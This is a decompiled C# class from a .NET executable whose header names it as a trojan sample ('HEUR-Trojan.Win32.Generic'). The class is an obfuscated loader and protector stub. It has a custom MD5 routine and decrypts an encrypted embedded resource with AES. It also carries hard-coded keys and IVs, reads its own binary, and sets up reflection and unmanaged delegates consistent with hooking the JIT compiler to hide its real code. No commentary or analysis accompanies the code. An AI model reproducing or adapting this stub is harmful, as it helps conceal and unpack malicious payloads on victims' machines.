// Decompiled with JetBrains decompiler
// Type: ProjNet.Bridges.ListenerAdvisor
// Assembly: IRefl, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A29A65F6-B7ED-422C-83D4-B9EFD61E5F13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-8e89881e34371e10b7f9cb943183a061aab9b22853cb7192e1ac09401f4cc545.exe

using ProjNet.Structs;
using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace ProjNet.Bridges
{
  internal class ListenerAdvisor
  {
    private static bool m_FieldAdvisor = false;
    private static Assembly _PolicyAdvisor = typeof (ListenerAdvisor).Assembly;
    private static uint[] m_ParameterAdvisor = new uint[64]
    {
      3614090360U,
      3905402710U,
      606105819U,
      3250441966U,
      4118548399U,
      1200080426U,
      2821735955U,
      4249261313U,
      1770035416U,
      2336552879U,
      4294925233U,
      2304563134U,
      1804603682U,
      4254626195U,
      2792965006U,
      1236535329U,
      4129170786U,
      3225465664U,
      643717713U,
      3921069994U,
      3593408605U,
      38016083U,
      3634488961U,
      3889429448U,
      568446438U,
      3275163606U,
      4107603335U,
      1163531501U,
      2850285829U,
      4243563512U,
      1735328473U,
      2368359562U,
      4294588738U,
      2272392833U,
      1839030562U,
      4259657740U,
      2763975236U,
      1272893353U,
      4139469664U,
      3200236656U,
      681279174U,
      3936430074U,
      3572445317U,
      76029189U,
      3654602809U,
      3873151461U,
      530742520U,
      3299628645U,
      4096336452U,
      1126891415U,
      2878612391U,
      4237533241U,
      1700485571U,
      2399980690U,
      4293915773U,
      2240044497U,
      1873313359U,
      4264355552U,
      2734768916U,
      1309151649U,
      4149444226U,
      3174756917U,
      718787259U,
      3951481745U
    };
    private static bool _ProcAdvisor = false;
    private static bool processFacade = false;
    private static byte[] registryFacade = new byte[0];
    private static byte[] advisorFacade = new byte[0];
    private static byte[] m_FacadeFacade = new byte[0];
    private static byte[] _StatusFacade = new byte[0];
    private static IntPtr itemFacade = IntPtr.Zero;
    private static IntPtr merchantFacade = IntPtr.Zero;
    private static object m_ObserverFacade = (object) new string[0];
    private static int[] m_ObjectFacade = new int[0];
    private static int m_SingletonFacade = 1;
    private static bool _ValueFacade = false;
    private static SortedList _ServiceFacade = new SortedList();
    private static int m_PrototypeFacade = 0;
    private static long m_TokenizerFacade = 0;
    internal static ListenerAdvisor.ResolverFacade m_ThreadFacade = (ListenerAdvisor.ResolverFacade) null;
    internal static ListenerAdvisor.ResolverFacade containerFacade = (ListenerAdvisor.ResolverFacade) null;
    private static long infoFacade = 0;
    private static int _PublisherFacade = 0;
    private static bool indexerFacade = false;
    private static bool m_InvocationFacade = false;
    private static int _WatcherFacade = 0;
    private static IntPtr m_MappingFacade = IntPtr.Zero;
    [ListenerAdvisor.ParamFacade(typeof (ListenerAdvisor.ParamFacade.WriterServiceSpec<object>[]))]
    private static bool _DecoratorFacade = false;
    internal static Hashtable connectionFacade = new Hashtable();

    [MethodImpl(MethodImplOptions.NoInlining)]
    static ListenerAdvisor()
    {
      try
      {
        RSACryptoServiceProvider.UseMachineKeyStore = true;
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void SetCreator()
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static byte[] StartStatus(byte[] asset)
    {
      uint[] numArray1 = new uint[16];
      uint num1 = (uint) ((448 - asset.Length * 8 % 512 + 512) % 512);
      if (num1 == 0U)
        num1 = 512U;
      uint length = (uint) ((ulong) asset.Length + (ulong) (num1 / 8U) + 8UL);
      ulong num2 = (ulong) asset.Length * 8UL;
      byte[] numArray2 = new byte[(IntPtr) length];
      for (int index = 0; index < asset.Length; ++index)
        numArray2[index] = asset[index];
      numArray2[asset.Length] |= (byte) 128;
      for (int index = 8; index > 0; --index)
        numArray2[(long) length - (long) index] = (byte) (num2 >> (8 - index) * 8 & (ulong) byte.MaxValue);
      uint num3 = (uint) (numArray2.Length * 8) / 32U;
      uint num4 = 1732584193;
      uint num5 = 4023233417;
      uint num6 = 2562383102;
      uint num7 = 271733878;
      for (uint index1 = 0; index1 < num3 / 16U; ++index1)
      {
        uint num8 = index1 << 6;
        for (uint index2 = 0; index2 < 61U; index2 += 4U)
          numArray1[(IntPtr) (index2 >> 2)] = (uint) ((int) numArray2[(IntPtr) (num8 + (index2 + 3U))] << 24 | (int) numArray2[(IntPtr) (num8 + (index2 + 2U))] << 16 | (int) numArray2[(IntPtr) (num8 + (index2 + 1U))] << 8) | (uint) numArray2[(IntPtr) (num8 + index2)];
        uint num9 = num4;
        uint num10 = num5;
        uint num11 = num6;
        uint num12 = num7;
        ListenerAdvisor.LogoutStatus(ref num4, num5, num6, num7, 0U, (ushort) 7, 1U, numArray1);
        ListenerAdvisor.LogoutStatus(ref num7, num4, num5, num6, 1U, (ushort) 12, 2U, numArray1);
        ListenerAdvisor.LogoutStatus(ref num6, num7, num4, num5, 2U, (ushort) 17, 3U, numArray1);
        ListenerAdvisor.LogoutStatus(ref num5, num6, num7, num4, 3U, (ushort) 22, 4U, numArray1);
        ListenerAdvisor.LogoutStatus(ref num4, num5, num6, num7, 4U, (ushort) 7, 5U, numArray1);
        ListenerAdvisor.LogoutStatus(ref num7, num4, num5, num6, 5U, (ushort) 12, 6U, numArray1);
        ListenerAdvisor.LogoutStatus(ref num6, num7, num4, num5, 6U, (ushort) 17, 7U, numArray1);
        ListenerAdvisor.LogoutStatus(ref num5, num6, num7, num4, 7U, (ushort) 22, 8U, numArray1);
        ListenerAdvisor.LogoutStatus(ref num4, num5, num6, num7, 8U, (ushort) 7, 9U, numArray1);
        ListenerAdvisor.LogoutStatus(ref num7, num4, num5, num6, 9U, (ushort) 12, 10U, numArray1);
        ListenerAdvisor.LogoutStatus(ref num6, num7, num4, num5, 10U, (ushort) 17, 11U, numArray1);
        ListenerAdvisor.LogoutStatus(ref num5, num6, num7, num4, 11U, (ushort) 22, 12U, numArray1);
        ListenerAdvisor.LogoutStatus(ref num4, num5, num6, num7, 12U, (ushort) 7, 13U, numArray1);
        ListenerAdvisor.LogoutStatus(ref num7, num4, num5, num6, 13U, (ushort) 12, 14U, numArray1);
        ListenerAdvisor.LogoutStatus(ref num6, num7, num4, num5, 14U, (ushort) 17, 15U, numArray1);
        ListenerAdvisor.LogoutStatus(ref num5, num6, num7, num4, 15U, (ushort) 22, 16U, numArray1);
        ListenerAdvisor.IncludeStatus(ref num4, num5, num6, num7, 1U, (ushort) 5, 17U, numArray1);
        ListenerAdvisor.IncludeStatus(ref num7, num4, num5, num6, 6U, (ushort) 9, 18U, numArray1);
        ListenerAdvisor.IncludeStatus(ref num6, num7, num4, num5, 11U, (ushort) 14, 19U, numArray1);
        ListenerAdvisor.IncludeStatus(ref num5, num6, num7, num4, 0U, (ushort) 20, 20U, numArray1);
        ListenerAdvisor.IncludeStatus(ref num4, num5, num6, num7, 5U, (ushort) 5, 21U, numArray1);
        ListenerAdvisor.IncludeStatus(ref num7, num4, num5, num6, 10U, (ushort) 9, 22U, numArray1);
        ListenerAdvisor.IncludeStatus(ref num6, num7, num4, num5, 15U, (ushort) 14, 23U, numArray1);
        ListenerAdvisor.IncludeStatus(ref num5, num6, num7, num4, 4U, (ushort) 20, 24U, numArray1);
        ListenerAdvisor.IncludeStatus(ref num4, num5, num6, num7, 9U, (ushort) 5, 25U, numArray1);
        ListenerAdvisor.IncludeStatus(ref num7, num4, num5, num6, 14U, (ushort) 9, 26U, numArray1);
        ListenerAdvisor.IncludeStatus(ref num6, num7, num4, num5, 3U, (ushort) 14, 27U, numArray1);
        ListenerAdvisor.IncludeStatus(ref num5, num6, num7, num4, 8U, (ushort) 20, 28U, numArray1);
        ListenerAdvisor.IncludeStatus(ref num4, num5, num6, num7, 13U, (ushort) 5, 29U, numArray1);
        ListenerAdvisor.IncludeStatus(ref num7, num4, num5, num6, 2U, (ushort) 9, 30U, numArray1);
        ListenerAdvisor.IncludeStatus(ref num6, num7, num4, num5, 7U, (ushort) 14, 31U, numArray1);
        ListenerAdvisor.IncludeStatus(ref num5, num6, num7, num4, 12U, (ushort) 20, 32U, numArray1);
        ListenerAdvisor.PublishStatus(ref num4, num5, num6, num7, 5U, (ushort) 4, 33U, numArray1);
        ListenerAdvisor.PublishStatus(ref num7, num4, num5, num6, 8U, (ushort) 11, 34U, numArray1);
        ListenerAdvisor.PublishStatus(ref num6, num7, num4, num5, 11U, (ushort) 16, 35U, numArray1);
        ListenerAdvisor.PublishStatus(ref num5, num6, num7, num4, 14U, (ushort) 23, 36U, numArray1);
        ListenerAdvisor.PublishStatus(ref num4, num5, num6, num7, 1U, (ushort) 4, 37U, numArray1);
        ListenerAdvisor.PublishStatus(ref num7, num4, num5, num6, 4U, (ushort) 11, 38U, numArray1);
        ListenerAdvisor.PublishStatus(ref num6, num7, num4, num5, 7U, (ushort) 16, 39U, numArray1);
        ListenerAdvisor.PublishStatus(ref num5, num6, num7, num4, 10U, (ushort) 23, 40U, numArray1);
        ListenerAdvisor.PublishStatus(ref num4, num5, num6, num7, 13U, (ushort) 4, 41U, numArray1);
        ListenerAdvisor.PublishStatus(ref num7, num4, num5, num6, 0U, (ushort) 11, 42U, numArray1);
        ListenerAdvisor.PublishStatus(ref num6, num7, num4, num5, 3U, (ushort) 16, 43U, numArray1);
        ListenerAdvisor.PublishStatus(ref num5, num6, num7, num4, 6U, (ushort) 23, 44U, numArray1);
        ListenerAdvisor.PublishStatus(ref num4, num5, num6, num7, 9U, (ushort) 4, 45U, numArray1);
        ListenerAdvisor.PublishStatus(ref num7, num4, num5, num6, 12U, (ushort) 11, 46U, numArray1);
        ListenerAdvisor.PublishStatus(ref num6, num7, num4, num5, 15U, (ushort) 16, 47U, numArray1);
        ListenerAdvisor.PublishStatus(ref num5, num6, num7, num4, 2U, (ushort) 23, 48U, numArray1);
        ListenerAdvisor.FlushStatus(ref num4, num5, num6, num7, 0U, (ushort) 6, 49U, numArray1);
        ListenerAdvisor.FlushStatus(ref num7, num4, num5, num6, 7U, (ushort) 10, 50U, numArray1);
        ListenerAdvisor.FlushStatus(ref num6, num7, num4, num5, 14U, (ushort) 15, 51U, numArray1);
        ListenerAdvisor.FlushStatus(ref num5, num6, num7, num4, 5U, (ushort) 21, 52U, numArray1);
        ListenerAdvisor.FlushStatus(ref num4, num5, num6, num7, 12U, (ushort) 6, 53U, numArray1);
        ListenerAdvisor.FlushStatus(ref num7, num4, num5, num6, 3U, (ushort) 10, 54U, numArray1);
        ListenerAdvisor.FlushStatus(ref num6, num7, num4, num5, 10U, (ushort) 15, 55U, numArray1);
        ListenerAdvisor.FlushStatus(ref num5, num6, num7, num4, 1U, (ushort) 21, 56U, numArray1);
        ListenerAdvisor.FlushStatus(ref num4, num5, num6, num7, 8U, (ushort) 6, 57U, numArray1);
        ListenerAdvisor.FlushStatus(ref num7, num4, num5, num6, 15U, (ushort) 10, 58U, numArray1);
        ListenerAdvisor.FlushStatus(ref num6, num7, num4, num5, 6U, (ushort) 15, 59U, numArray1);
        ListenerAdvisor.FlushStatus(ref num5, num6, num7, num4, 13U, (ushort) 21, 60U, numArray1);
        ListenerAdvisor.FlushStatus(ref num4, num5, num6, num7, 4U, (ushort) 6, 61U, numArray1);
        ListenerAdvisor.FlushStatus(ref num7, num4, num5, num6, 11U, (ushort) 10, 62U, numArray1);
        ListenerAdvisor.FlushStatus(ref num6, num7, num4, num5, 2U, (ushort) 15, 63U, numArray1);
        ListenerAdvisor.FlushStatus(ref num5, num6, num7, num4, 9U, (ushort) 21, 64U, numArray1);
        num4 += num9;
        num5 += num10;
        num6 += num11;
        num7 += num12;
      }
      byte[] destinationArray = new byte[16];
      Array.Copy((Array) BitConverter.GetBytes(num4), 0, (Array) destinationArray, 0, 4);
      Array.Copy((Array) BitConverter.GetBytes(num5), 0, (Array) destinationArray, 4, 4);
      Array.Copy((Array) BitConverter.GetBytes(num6), 0, (Array) destinationArray, 8, 4);
      Array.Copy((Array) BitConverter.GetBytes(num7), 0, (Array) destinationArray, 12, 4);
      return destinationArray;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void LogoutStatus(
      ref uint asset,
      uint maxselection,
      uint index_dir,
      uint row_token2,
      uint map3_max,
      ushort removeSELECTION4At,
      uint flags_init5,
      uint[] pred6)
    {
      asset = maxselection + ListenerAdvisor.CalcStatus(asset + (uint) ((int) maxselection & (int) index_dir | ~(int) maxselection & (int) row_token2) + pred6[(IntPtr) map3_max] + ListenerAdvisor.m_ParameterAdvisor[(IntPtr) (flags_init5 - 1U)], removeSELECTION4At);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void IncludeStatus(
      ref uint task,
      uint numcaller,
      uint dic_length,
      uint item2_size,
      uint remove_V3At,
      ushort item4_high,
      uint start_token5,
      uint[] ord6)
    {
      task = numcaller + ListenerAdvisor.CalcStatus(task + (uint) ((int) numcaller & (int) item2_size | (int) dic_length & ~(int) item2_size) + ord6[(IntPtr) remove_V3At] + ListenerAdvisor.m_ParameterAdvisor[(IntPtr) (start_token5 - 1U)], item4_high);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void PublishStatus(
      ref uint setup,
      uint connection,
      uint next_tag,
      uint last2Z,
      uint endt3,
      ushort flags_param4,
      uint next_item5,
      uint[] cust6)
    {
      setup = connection + ListenerAdvisor.CalcStatus(setup + (connection ^ next_tag ^ last2Z) + cust6[(IntPtr) endt3] + ListenerAdvisor.m_ParameterAdvisor[(IntPtr) (next_item5 - 1U)], flags_param4);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void FlushStatus(
      ref uint key,
      uint no_second,
      uint previous_proc,
      uint indexOf_value2,
      uint cfg3_low,
      ushort def4_Ptr,
      uint min_col5,
      uint[] instance6)
    {
      key = no_second + ListenerAdvisor.CalcStatus(key + (previous_proc ^ (no_second | ~indexOf_value2)) + instance6[(IntPtr) cfg3_low] + ListenerAdvisor.m_ParameterAdvisor[(IntPtr) (min_col5 - 1U)], def4_Ptr);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static uint CalcStatus(uint var1, ushort selection_High) => var1 >> 32 - (int) selection_High | var1 << (int) selection_High;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool CloneStatus()
    {
      if (!ListenerAdvisor._ProcAdvisor)
      {
        ListenerAdvisor.CompareStatus();
        ListenerAdvisor._ProcAdvisor = true;
      }
      return ListenerAdvisor.processFacade;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static SymmetricAlgorithm GetStatus()
    {
      if (ListenerAdvisor.CloneStatus())
        return (SymmetricAlgorithm) new AesCryptoServiceProvider();
      try
      {
        return (SymmetricAlgorithm) new RijndaelManaged();
      }
      catch
      {
        return (SymmetricAlgorithm) Activator.CreateInstance("System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089", "System.Security.Cryptography.AesCryptoServiceProvider").Unwrap();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void CompareStatus()
    {
      try
      {
        ListenerAdvisor.processFacade = CryptoConfig.AllowOnlyFipsAlgorithms;
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static byte[] LoginStatus(byte[] param) => !ListenerAdvisor.CloneStatus() ? new MD5CryptoServiceProvider().ComputeHash(param) : ListenerAdvisor.StartStatus(param);

    [ListenerAdvisor.ParamFacade(typeof (ListenerAdvisor.ParamFacade.WriterServiceSpec<object>[]))]
    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool ListStatus(int instanceLow)
    {
      if (ListenerAdvisor.advisorFacade.Length == 0)
      {
        BinaryReader binaryReader = new BinaryReader(ListenerAdvisor._PolicyAdvisor.GetManifestResourceStream("{11111-22222-20001-00000}"));
        binaryReader.BaseStream.Position = 0L;
        RSACryptoServiceProvider.UseMachineKeyStore = true;
        byte[] buffer = binaryReader.ReadBytes((int) binaryReader.BaseStream.Length);
        byte[] rgbKey = new ListenerAdvisor().ExcludeStatus();
        byte[] status1 = new ListenerAdvisor().CalculateStatus();
        byte[] publicKeyToken = ListenerAdvisor._PolicyAdvisor.GetName().GetPublicKeyToken();
        if (publicKeyToken != null && publicKeyToken.Length > 0)
        {
          status1[1] = publicKeyToken[0];
          status1[3] = publicKeyToken[1];
          status1[5] = publicKeyToken[2];
          status1[7] = publicKeyToken[3];
          status1[9] = publicKeyToken[4];
          status1[11] = publicKeyToken[5];
          status1[13] = publicKeyToken[6];
          status1[15] = publicKeyToken[7];
        }
        SymmetricAlgorithm status2 = ListenerAdvisor.GetStatus();
        status2.Mode = CipherMode.CBC;
        ICryptoTransform decryptor = status2.CreateDecryptor(rgbKey, status1);
        MemoryStream memoryStream = new MemoryStream();
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Write);
        cryptoStream.Write(buffer, 0, buffer.Length);
        cryptoStream.FlushFinalBlock();
        ListenerAdvisor.advisorFacade = memoryStream.ToArray();
        memoryStream.Close();
        cryptoStream.Close();
        binaryReader.Close();
      }
      if (ListenerAdvisor.registryFacade.Length == 0)
        ListenerAdvisor.registryFacade = ListenerAdvisor.FillStatus(ListenerAdvisor.CancelStatus((object) ListenerAdvisor._PolicyAdvisor).ToString());
      int index = 0;
      try
      {
        index = BitConverter.ToInt32(new byte[4]
        {
          ListenerAdvisor.advisorFacade[instanceLow],
          ListenerAdvisor.advisorFacade[instanceLow + 1],
          ListenerAdvisor.advisorFacade[instanceLow + 2],
          ListenerAdvisor.advisorFacade[instanceLow + 3]
        }, 0);
      }
      catch
      {
      }
      try
      {
        if (ListenerAdvisor.registryFacade[index] == (byte) 128)
          return true;
      }
      catch
      {
      }
      return false;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static uint VerifyStatus(uint maxtask) => (uint) "{11111-22222-10009-11111}".Length;

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static uint ViewStatus(uint nextinfo) => (uint) "{11111-22222-10009-11112}".Length;

    [ListenerAdvisor.ParamFacade(typeof (ListenerAdvisor.ParamFacade.WriterServiceSpec<object>[]))]
    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static string RegisterStatus(string i)
    {
      "{11111-22222-50001-00000}".Trim();
      byte[] bytes = Convert.FromBase64String(i);
      return Encoding.Unicode.GetString(bytes, 0, bytes.Length);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static int PopStatus() => 5;

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void SetStatus()
    {
      try
      {
        RSACryptoServiceProvider.UseMachineKeyStore = true;
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static Delegate PrepareStatus(IntPtr i, Type cont) => (Delegate) typeof (Marshal).GetMethod("GetDelegateForFunctionPointer", new Type[2]
    {
      typeof (IntPtr),
      typeof (Type)
    }).Invoke((object) null, new object[2]
    {
      (object) i,
      (object) cont
    });

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object CancelStatus(object spec)
    {
      try
      {
        if (File.Exists(((Assembly) spec).Location))
          return (object) ((Assembly) spec).Location;
      }
      catch
      {
      }
      try
      {
        if (File.Exists(((Assembly) spec).GetName().CodeBase.ToString().Replace("file:///", "")))
          return (object) ((Assembly) spec).GetName().CodeBase.ToString().Replace("file:///", "");
      }
      catch
      {
      }
      try
      {
        if (File.Exists(spec.GetType().GetProperty("Location").GetValue(spec, new object[0]).ToString()))
          return (object) spec.GetType().GetProperty("Location").GetValue(spec, new object[0]).ToString();
      }
      catch
      {
      }
      return (object) "";
    }

    [ListenerAdvisor.ParamFacade(typeof (ListenerAdvisor.ParamFacade.WriterServiceSpec<object>[]))]
    [MethodImpl(MethodImplOptions.NoInlining)]
    private static byte[] FillStatus(string last)
    {
      byte[] buffer;
      using (FileStream fileStream = new FileStream(last, FileMode.Open, FileAccess.Read, FileShare.Read))
      {
        int offset = 0;
        int length = (int) fileStream.Length;
        buffer = new byte[length];
        int num;
        for (; length > 0; length -= num)
        {
          num = fileStream.Read(buffer, offset, length);
          offset += num;
        }
      }
      return buffer;
    }

    [ListenerAdvisor.ParamFacade(typeof (ListenerAdvisor.ParamFacade.WriterServiceSpec<object>[]))]
    [MethodImpl(MethodImplOptions.NoInlining)]
    private static byte[] SetupStatus(byte[] v)
    {
      MemoryStream memoryStream = new MemoryStream();
      SymmetricAlgorithm status = ListenerAdvisor.GetStatus();
      status.Key = new byte[32]
      {
        (byte) 123,
        (byte) 5,
        (byte) 74,
        (byte) 12,
        (byte) 244,
        (byte) 156,
        (byte) 221,
        (byte) 154,
        (byte) 121,
        (byte) 221,
        (byte) 183,
        (byte) 41,
        (byte) 121,
        (byte) 65,
        (byte) 9,
        (byte) 43,
        (byte) 67,
        (byte) 81,
        (byte) 23,
        (byte) 43,
        (byte) 74,
        (byte) 63,
        (byte) 64,
        (byte) 23,
        (byte) 95,
        (byte) 185,
        (byte) 226,
        (byte) 244,
        (byte) 45,
        (byte) 194,
        (byte) 211,
        (byte) 43
      };
      status.IV = new byte[16]
      {
        (byte) 117,
        (byte) 254,
        (byte) 41,
        (byte) 121,
        (byte) 65,
        (byte) 52,
        (byte) 9,
        (byte) 43,
        (byte) 221,
        (byte) 154,
        (byte) 12,
        (byte) 54,
        (byte) 68,
        (byte) 241,
        (byte) 68,
        (byte) 66
      };
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, status.CreateDecryptor(), CryptoStreamMode.Write);
      cryptoStream.Write(v, 0, v.Length);
      cryptoStream.Close();
      return memoryStream.ToArray();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] ValidateStatus() => "{11111-22222-10001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] AwakeStatus() => "{11111-22222-10001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] CalculateStatus() => "{11111-22222-20001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] ExcludeStatus() => "{11111-22222-20001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] MoveStatus() => "{11111-22222-30001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] CustomizeStatus() => "{11111-22222-30001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal byte[] ComputeStatus() => "{11111-22222-40001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal byte[] ConcatStatus() => "{11111-22222-40001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal byte[] CheckStatus() => "{11111-22222-50001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal byte[] QueryStatus() => "{11111-22222-50001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    public ListenerAdvisor()
    {
    }

    internal class ParamFacade : Attribute
    {
      [ListenerAdvisor.ParamFacade(typeof (ListenerAdvisor.ParamFacade.WriterServiceSpec<object>[]))]
      [MethodImpl(MethodImplOptions.NoInlining)]
      public ParamFacade(object asset)
      {
        PageAdvisorStructBuilder.PrepareCreator();
        // ISSUE: explicit constructor call
        base.\u002Ector();
      }

      internal class WriterServiceSpec<T>
      {
        [MethodImpl(MethodImplOptions.NoInlining)]
        public WriterServiceSpec()
        {
          PageAdvisorStructBuilder.PrepareCreator();
          // ISSUE: explicit constructor call
          base.\u002Ector();
        }

        internal static bool StartCreator() => true;

        internal static bool UpdateCreator() => false;
      }
    }

    internal class DescriptorFacade
    {
      [ListenerAdvisor.ParamFacade(typeof (ListenerAdvisor.ParamFacade.WriterServiceSpec<object>[]))]
      [MethodImpl(MethodImplOptions.NoInlining)]
      internal static string ReflectStatus(string spec, string connection)
      {
        byte[] bytes = Encoding.Unicode.GetBytes(spec);
        byte[] numArray1 = new byte[32]
        {
          (byte) 82,
          (byte) 102,
          (byte) 104,
          (byte) 110,
          (byte) 32,
          (byte) 77,
          (byte) 24,
          (byte) 34,
          (byte) 118,
          (byte) 181,
          (byte) 51,
          (byte) 17,
          (byte) 18,
          (byte) 51,
          (byte) 12,
          (byte) 109,
          (byte) 10,
          (byte) 32,
          (byte) 77,
          (byte) 24,
          (byte) 34,
          (byte) 158,
          (byte) 161,
          (byte) 41,
          (byte) 97,
          (byte) 28,
          (byte) 118,
          (byte) 181,
          (byte) 5,
          (byte) 25,
          (byte) 1,
          (byte) 88
        };
        byte[] numArray2 = ListenerAdvisor.LoginStatus(Encoding.Unicode.GetBytes(connection));
        MemoryStream memoryStream = new MemoryStream();
        SymmetricAlgorithm status = ListenerAdvisor.GetStatus();
        status.Key = numArray1;
        status.IV = numArray2;
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, status.CreateEncryptor(), CryptoStreamMode.Write);
        cryptoStream.Write(bytes, 0, bytes.Length);
        cryptoStream.Close();
        return Convert.ToBase64String(memoryStream.ToArray());
      }

      [MethodImpl(MethodImplOptions.NoInlining)]
      public DescriptorFacade()
      {
        PageAdvisorStructBuilder.PrepareCreator();
        // ISSUE: explicit constructor call
        base.\u002Ector();
      }
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    internal delegate uint ResolverFacade(
      IntPtr classthis,
      IntPtr comp,
      IntPtr info,
      [MarshalAs(UnmanagedType.U4)] uint flags,
      IntPtr nativeEntry,
      ref uint nativeSizeOfCode);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate IntPtr ImporterFacade();

    internal struct BaseStatusService
    {
      internal bool m_ProductFacade;
      internal byte[] _DicFacade;
    }

    [Flags]
    private enum ApplicationRoleOptionKind
    {
    }
  }
}
